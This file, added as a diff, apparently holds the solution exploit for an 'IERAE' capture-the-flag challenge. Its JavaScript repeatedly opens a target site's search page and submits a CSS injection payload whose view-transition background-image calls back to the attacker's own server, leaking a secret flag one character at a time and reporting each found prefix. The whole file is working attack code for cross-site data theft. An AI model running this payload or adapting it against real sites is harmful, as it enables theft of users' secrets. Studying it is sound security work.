@@ -1,0 +1,60 @@
+<form method="post">
+  <input name="style" />
+</form>
+
+<script>
+  const serverHost = window.origin
+  const targetHost = "http://web:3000"
+
+  const sleep = async (time) =>
+    new Promise((resolve) => setTimeout(resolve, time));
+
+  const defaultChars = "abcdefghijklmnopqrstuvwxyz".split("");
+  const search = async (prefix, chars = defaultChars) => {
+    for (let char of chars) {
+      const search = `${prefix}${char}`;
+      const winName = `win${search}`;
+      const win = window.open(
+        `${targetHost}/?search=${encodeURIComponent(
+          search
+        )}`,
+        winName,
+        "width=500,height=500"
+      );
+
+      await sleep(200);
+
+      const form = document.querySelector("form");
+      form.action = `${targetHost}/create`;
+      form.target = winName;
+      document.querySelector("input").value = `
+        ::view-transition-new(site-title) {
+          animation-duration: 500s;
+          background-image: url(${serverHost}/add?q=${char});
+        }
+      `;
+      form.submit();
+
+      setTimeout(() => {
+        win.close();
+      }, 1000);
+    }
+
+    await sleep(1000);
+
+    const notFounds = await (await fetch("/finish")).json();
+    const flagChars = chars.filter((c) => !notFounds.includes(c));
+    if (flagChars.length === 1) {
+      prefix = prefix + flagChars[0];
+      fetch(`/flag=${prefix}`);
+      search(prefix);
+    } else if (flagChars.length > 1) {
+      // something wrong. search again with flagChars
+      search(prefix, flagChars);
+    } else {
+      // finish
+      console.log(`flag found: ${prefix}`)
+    }
+  };
+  search("IERAE{");
+</script>
